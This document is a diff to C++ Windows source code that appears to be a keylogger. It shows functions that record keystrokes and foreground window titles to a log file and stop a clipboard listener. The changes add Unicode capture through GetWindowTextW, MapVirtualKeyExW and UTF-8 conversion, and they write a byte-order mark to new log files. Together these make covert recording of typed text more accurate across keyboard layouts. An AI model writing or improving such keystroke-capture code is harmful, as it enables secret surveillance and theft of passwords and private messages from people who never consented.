@@ -2,6 +2,8 @@
 #include <Windows.h>
 #include <Shellapi.h>
 #include <cstring>
+#include <cwchar>
+#include <cwctype>
 #include <cstdio>
 #include <fstream>
 #include <iostream>
@@ -104,6 +106,13 @@ bool OpenLogFile()
 		return false;
 	}
 
+	WIN32_FILE_ATTRIBUTE_DATA file_info = {};
+	bool needs_utf8_bom = true;
+	if (GetFileAttributesExA(output_filename, GetFileExInfoStandard, &file_info))
+	{
+		needs_utf8_bom = file_info.nFileSizeHigh == 0 && file_info.nFileSizeLow == 0;
+	}
+
 	output_file.clear();
 	output_file.open(output_filename, std::ios_base::app);
 	if (!output_file.is_open())
@@ -111,6 +120,12 @@ bool OpenLogFile()
 		log_retry_pending = true;
 		next_log_retry = GetTickCount64() + log_idle_timeout_ms;
 		return false;
+	}
+
+	if (needs_utf8_bom)
+	{
+		output_file.write("\xEF\xBB\xBF", 3);
+		output_file.flush();
 	}
 
 	log_retry_pending = false;
@@ -357,7 +372,7 @@ void StopClipboardListener()
 int Save(int key_stroke)
 {
 	std::stringstream output;
-	static char lastwindow[256] = "";
+	static wchar_t lastwindow[256] = L"";
 #ifndef mouseignore 
 	if ((key_stroke == 1) || (key_stroke == 2))
 	{
@@ -382,15 +397,15 @@ int Save(int key_stroke)
 
 	if (foreground)
 	{
-		char window_title[256];
-		GetWindowTextA(foreground, (LPSTR)window_title, 256);
+		wchar_t window_title[256];
+		GetWindowTextW(foreground, window_title, 256);
 
-		if (strcmp(window_title, lastwindow) != 0)
+		if (wcscmp(window_title, lastwindow) != 0)
 		{
-			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
+			wcscpy_s(lastwindow, window_title);
 			char s[64];
 			strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
-			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
+			output << "\n\n[Window: " << WideToUtf8(window_title) << " - at " << s << "] ";
 		}
 	}
 
@@ -405,7 +420,7 @@ int Save(int key_stroke)
 	}
 	else
 	{
-		char key;
+		wchar_t key;
 		// check caps lock
 		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
@@ -416,15 +431,14 @@ int Save(int key_stroke)
 			lowercase = !lowercase;
 		}
 
-		// map virtual key according to keyboard layout
-		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
+		// Map the virtual key to Unicode according to the active keyboard layout.
+		key = static_cast<wchar_t>(MapVirtualKeyExW(key_stroke, MAPVK_VK_TO_CHAR, layout));
 
-		// tolower converts it to lowercase properly
 		if (!lowercase)
 		{
-			key = tolower(key);
+			key = static_cast<wchar_t>(towlower(key));
 		}
-		output << char(key);
+		output << WideToUtf8(std::wstring(1, key));
 	}
 #endif
 	return WriteLog(output.str());
